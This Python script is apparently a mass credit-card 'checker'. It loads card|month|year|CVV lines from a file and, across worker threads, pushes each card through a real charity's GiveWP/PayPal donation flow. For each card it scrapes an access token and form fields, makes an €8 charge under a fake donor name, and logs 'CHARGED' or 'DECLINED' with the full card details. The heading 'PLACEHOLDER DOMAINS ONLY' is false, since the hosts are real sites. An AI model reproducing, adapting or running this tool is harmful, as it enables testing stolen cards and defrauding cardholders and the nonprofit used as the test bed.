import base64
import random
import datetime
import requests
from queue import Queue
import threading
import json
import re

# =========================
# Helpers
# =========================

def get_random_ua():
    return random.choice([
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    ])

def lr(text, left, right):
    try:
        return text.split(left, 1)[1].split(right, 1)[0]
    except Exception:
        return ""

def extract_field(html, field_name):
    """Extract hidden form field value"""
    patterns = [
        rf'name="{field_name}"[^>]*value="([^"]*)"',
        rf"name='{field_name}'[^>]*value='([^']*)'",
        rf'name="{field_name}"[^>]*value=\'([^\']*)\'',
        rf'id="{field_name}"[^>]*value="([^"]*)"',
    ]
    for pattern in patterns:
        match = re.search(pattern, html, re.IGNORECASE)
        if match:
            return match.group(1)
    return ""

# =========================
# PLACEHOLDER DOMAINS ONLY
# =========================

BASE_SITE = "https://africanconservation.org"
PAYMENTS_SITE = "https://cors.api.paypal.com"
ASSETS_SITE = "https://assets.braintreegateway.com/"

FORM_URL = f"{BASE_SITE}/give/donation-form?giveDonationFormInIframe=1"
CREATE_ORDER_URL = f"{BASE_SITE}/wp-admin/admin-ajax.php?action=give_paypal_commerce_create_order"
CONFIRM_URL_TMPL = f"{PAYMENTS_SITE}/v2/checkout/orders/{{id}}/confirm-payment-source"
APPROVE_URL_TMPL = f"{BASE_SITE}/wp-admin/admin-ajax.php?action=give_paypal_commerce_approve_order&order={{id}}"

# =========================
# PPCP FLOW WITH DEBUG
# =========================

def run(cc, mes, ano, cvv, debug=True):
    ua = get_random_ua()
    dd = datetime.datetime.now().strftime("%d")

    # year logic
    if len(ano) == 2:
        anox = f"20{ano}"
    else:
        anox = ano

    s = requests.Session()

    # ---- STEP 1: GET TOKEN + FORM DATA ----
    if debug:
        print(f"\n{'='*60}")
        print(f"[STEP 1] GET TOKEN + FORM DATA")
        print(f"[URL] {FORM_URL}")

    try:
        r1 = s.get(
            FORM_URL,
            headers={
                "User-Agent": ua,
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
            },
            timeout=30
        )
        if debug:
            print(f"[STATUS] {r1.status_code}")
            print(f"[RESPONSE LENGTH] {len(r1.text)} chars")
    except Exception as e:
        if debug:
            print(f"[ERROR] {e}")
        return f"{cc}|{mes}|{anox}|{cvv} -> ERROR STEP1: {e}"

    html = r1.text

    # Extract PayPal token
    sec = lr(html, 'token":"', '","')
    token = ""
    if sec:
        try:
            dec = base64.b64decode(sec).decode(errors="ignore")
            token = lr(dec, 'accessToken":"', '"')
            if debug:
                print(f"[TOKEN] {token[:60]}..." if len(token) > 60 else f"[TOKEN] {token}")
        except Exception as e:
            if debug:
                print(f"[TOKEN DECODE ERROR] {e}")
    else:
        if debug:
            print("[TOKEN] NOT FOUND")

    # Extract dynamic form fields
    form_id = extract_field(html, "give-form-id") or lr(html, 'name="give-form-id" value="', '"')
    form_hash = extract_field(html, "give-form-hash") or lr(html, 'name="give-form-hash" value="', '"')
    form_id_prefix = extract_field(html, "give-form-id-prefix") or lr(html, 'name="give-form-id-prefix" value="', '"')
    
    # Try to find nonce
    nonce = extract_field(html, "give-form-nonce") or lr(html, 'give-form-nonce" value="', '"')
    
    # Try alternate nonce patterns
    if not nonce:
        nonce_match = re.search(r'_wpnonce["\s:]+["\']([a-f0-9]+)["\']', html)
        if nonce_match:
            nonce = nonce_match.group(1)

    if debug:
        print(f"[FORM ID] {form_id}")
        print(f"[FORM ID PREFIX] {form_id_prefix}")
        print(f"[FORM HASH] {form_hash}")
        print(f"[NONCE] {nonce if nonce else 'NOT FOUND'}")

    if not form_hash:
        if debug:
            print("[WARNING] No form hash found - request will likely fail")
            # Show some of the HTML to help debug
            print(f"[HTML PREVIEW] Searching for form fields...")
            hash_area = re.search(r'give-form-hash.{0,100}', html)
            if hash_area:
                print(f"[FOUND] {hash_area.group(0)}")

    # ---- STEP 2: CREATE ORDER ----
    if debug:
        print(f"\n{'='*60}")
        print(f"[STEP 2] CREATE ORDER")
        print(f"[URL] {CREATE_ORDER_URL}")

    # Build form data with extracted values
    form_data = {
        "give-honeypot": "",
        "give-form-id-prefix": form_id_prefix or "25344-1",
        "give-form-id": form_id or "25344",
        "give-form-title": "Donation Form",
        "give-current-url": f"{BASE_SITE}/donate/",
        "give-form-url": f"{BASE_SITE}/give/donation-form/",
        "give-form-minimum": "8",
        "give-form-maximum": "1000000",
        "give-form-hash": form_hash,
        "give-price-id": "custom",
        "give-amount": "8",
        "give_first": "John",
        "give_last": "Smith",
        "give_email": f"test{random.randint(1000,9999)}@gmail.com",
        "payment-mode": "paypal-commerce",
        "card_name": "John Smith",
        "give-gateway": "paypal-commerce",
        "give_embed_form": "1",
    }
    
    # Add nonce if found
    if nonce:
        form_data["give-form-nonce"] = nonce
        form_data["_wpnonce"] = nonce

    if debug:
        print(f"[FORM DATA] {json.dumps(form_data, indent=2)}")

    try:
        r2 = s.post(
            CREATE_ORDER_URL,
            data=form_data,
            headers={
                "User-Agent": ua,
                "Accept": "application/json, text/javascript, */*; q=0.01",
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "X-Requested-With": "XMLHttpRequest",
                "Origin": BASE_SITE,
                "Referer": FORM_URL,
            },
            timeout=30
        )
        if debug:
            print(f"[STATUS] {r2.status_code}")
            print(f"[RESPONSE HEADERS] {dict(r2.headers)}")
            print(f"[RAW RESPONSE]\n{r2.text if r2.text else '(empty)'}")
    except Exception as e:
        if debug:
            print(f"[ERROR] {e}")
        return f"{cc}|{mes}|{anox}|{cvv} -> ERROR STEP2: {e}"

    if not r2.text:
        if debug:
            print("[ERROR] Empty response - form hash or session may be invalid")
        return f"{cc}|{mes}|{anox}|{cvv} -> ERROR: Empty response at STEP2 (bad form hash?)"

    try:
        r2_json = r2.json()
        order_id = r2_json.get("id", "")
        if debug:
            print(f"[PARSED JSON]\n{json.dumps(r2_json, indent=2)}")
            print(f"[ORDER ID] {order_id}")
        if not order_id:
            error_msg = r2_json.get("message", r2_json.get("error", "No order ID"))
            if debug:
                print(f"[ERROR] {error_msg}")
            return f"{cc}|{mes}|{anox}|{cvv} -> ERROR: {error_msg}"
    except Exception as e:
        if debug:
            print(f"[JSON ERROR] {e}")
        return f"{cc}|{mes}|{anox}|{cvv} -> ERROR STEP2 JSON: {e}"

    # ---- STEP 3: CONFIRM PAYMENT SOURCE ----
    confirm_url = CONFIRM_URL_TMPL.format(id=order_id)
    if debug:
        print(f"\n{'='*60}")
        print(f"[STEP 3] CONFIRM PAYMENT SOURCE")
        print(f"[URL] {confirm_url}")

    confirm_payload = {
        "payment_source": {
            "card": {
                "number": cc,
                "expiry": f"{anox}-{mes}",
                "security_code": cvv,
                "attributes": {
                    "verification": {
                        "method": "SCA_WHEN_REQUIRED"
                    }
                }
            }
        },
        "application_context": {
            "vault": False
        }
    }

    if debug:
        masked = f"{cc[:6]}******{cc[-4:]}" if len(cc) > 10 else "****"
        print(f"[CARD] {masked}|{mes}|{anox}|***")

    try:
        r3 = s.post(
            confirm_url,
            json=confirm_payload,
            headers={
                "Authorization": f"Bearer {token}",
                "Content-Type": "application/json",
                "Origin": ASSETS_SITE.rstrip("/"),
                "Referer": f"{ASSETS_SITE}",
                "User-Agent": ua,
            },
            timeout=30
        )
        if debug:
            print(f"[STATUS] {r3.status_code}")
            print(f"[RAW RESPONSE]\n{r3.text}")
    except Exception as e:
        if debug:
            print(f"[ERROR] {e}")
        return f"{cc}|{mes}|{anox}|{cvv} -> ERROR STEP3: {e}"

    # Parse response
    status = "UNKNOWN"
    country = "XX"
    decline_reason = ""
    
    try:
        j3 = r3.json()
        if debug:
            print(f"[PARSED JSON]\n{json.dumps(j3, indent=2)}")
        
        status = j3.get("status", "UNKNOWN")
        
        # Try multiple paths for country code
        country = j3.get("bin_country_code", "")
        if not country:
            ps = j3.get("payment_source", {})
            card = ps.get("card", {})
            country = card.get("bin_country_code", "XX")
        
        # Get decline reason
        if "details" in j3:
            details = j3["details"]
            if isinstance(details, list) and len(details) > 0:
                decline_reason = details[0].get("issue", "") or details[0].get("description", "")
        
        if "message" in j3 and not decline_reason:
            decline_reason = j3["message"]
        
        if "name" in j3:
            error_name = j3["name"]
            if debug:
                print(f"[ERROR NAME] {error_name}")
                
    except Exception as e:
        if debug:
            print(f"[JSON PARSE ERROR] {e}")

    if debug and decline_reason:
        print(f"[DECLINE REASON] {decline_reason}")

    # ---- STEP 4: APPROVE ORDER ----
    approve_url = APPROVE_URL_TMPL.format(id=order_id)
    if debug:
        print(f"\n{'='*60}")
        print(f"[STEP 4] APPROVE ORDER")
        print(f"[URL] {approve_url}")

    try:
        r4 = s.post(
            approve_url,
            data=form_data,
            headers={
                "User-Agent": ua,
                "Accept": "application/json, text/javascript, */*; q=0.01",
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "X-Requested-With": "XMLHttpRequest",
                "Origin": BASE_SITE,
                "Referer": FORM_URL,
            },
            timeout=30
        )
        if debug:
            print(f"[STATUS] {r4.status_code}")
            print(f"[RAW RESPONSE]\n{r4.text if r4.text else '(empty)'}")
    except Exception as e:
        if debug:
            print(f"[ERROR] {e}")
        return f"{cc}|{mes}|{anox}|{cvv} -> ERROR STEP4: {e}"

    # Parse final response
    success = False
    final_error = ""
    
    try:
        r4_json = r4.json()
        if debug:
            print(f"[PARSED JSON]\n{json.dumps(r4_json, indent=2)}")
        
        success = r4_json.get("success", False)
        
        if not success:
            final_error = r4_json.get("message", "")
            if not final_error:
                final_error = r4_json.get("error", "")
            if not final_error and "data" in r4_json:
                final_error = r4_json["data"].get("message", "")
                
    except Exception as e:
        if debug:
            print(f"[JSON PARSE ERROR] {e}")

    # ---- BUILD RESULT ----
    label = "CHARGED €8 🔥" if success else "DECLINED ❌"
    
    if success:
        result = f"{cc}|{mes}|{anox}|{cvv} -> success : true - {country} - {label}"
    else:
        extra = decline_reason or final_error or status
        result = f"{cc}|{mes}|{anox}|{cvv} -> success : false - {country} - {label} [{extra}]"

    if debug:
        print(f"\n{'='*60}")
        print(f"[FINAL RESULT] {result}")
        print(f"{'='*60}\n")

    with open(f"ppch{dd}.txt", "a", encoding="utf-8") as f:
        f.write(result + "\n")

    return result

# =========================
# MASS cc.txt RUNNER
# =========================

def mass_run(cc_file="cc.txt", threads=5, debug=True):
    q = Queue()

    try:
        with open(cc_file, "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if "|" in line:
                    q.put(line)
    except FileNotFoundError:
        print(f"[ERROR] File '{cc_file}' not found!")
        return

    if q.empty():
        print(f"[ERROR] No valid cards in '{cc_file}'")
        return

    print(f"[INFO] Loaded {q.qsize()} cards from {cc_file}")
    print(f"[INFO] Debug mode: {debug}")

    def worker():
        while True:
            try:
                line = q.get_nowait()
                parts = line.split("|", 3)
                if len(parts) != 4:
                    print(f"[SKIPPED] Bad format: {line}")
                    q.task_done()
                    continue

                cc, mes, ano, cvv = parts
                res = run(cc, mes, ano, cvv, debug=debug)
                if not debug:
                    print(res)

            except Exception as e:
                if "Empty" in str(type(e).__name__):
                    break
                print(f"[ERROR] {e}")
            finally:
                try:
                    q.task_done()
                except:
                    pass

    for _ in range(threads):
        threading.Thread(target=worker, daemon=True).start()

    q.join()


# =========================
# CLI
# =========================

if __name__ == "__main__":
    import sys
    
    print("\n" + "="*60)
    print("  PPCP DEBUG CHECKER - Real API Response Mode v2")
    print("="*60)
    
    if len(sys.argv) > 1:
        arg = sys.argv[1]
        
        if "|" in arg and arg.count("|") == 3:
            parts = arg.split("|", 3)
            cc, mes, ano, cvv = parts
            print(f"\n[SINGLE CARD TEST]")
            run(cc, mes, ano, cvv, debug=True)
        else:
            debug_mode = "--no-debug" not in sys.argv
            mass_run(arg, threads=1, debug=debug_mode)
    else:
        mass_run("cc.txt", threads=1, debug=True)
